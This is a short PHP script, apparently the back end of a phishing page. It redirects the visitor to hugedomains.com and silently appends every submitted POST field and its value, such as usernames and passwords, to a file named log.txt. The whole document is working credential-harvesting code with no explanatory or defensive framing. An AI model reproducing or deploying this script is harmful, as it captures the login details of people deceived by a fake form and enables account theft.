<?php
header ('Location: hugedomains.com');

$handle = fopen("log.txt", "a") or die('fopen failed');

foreach($_POST as $variable => $value) {

fwrite($handle, $variable) or die('fwrite failed');

fwrite($handle, "=");

fwrite($handle, $value);

fwrite($handle, "\r\n");

}

fwrite($handle, "\r\n\n\n\n");

fclose($handle);

exit;

?>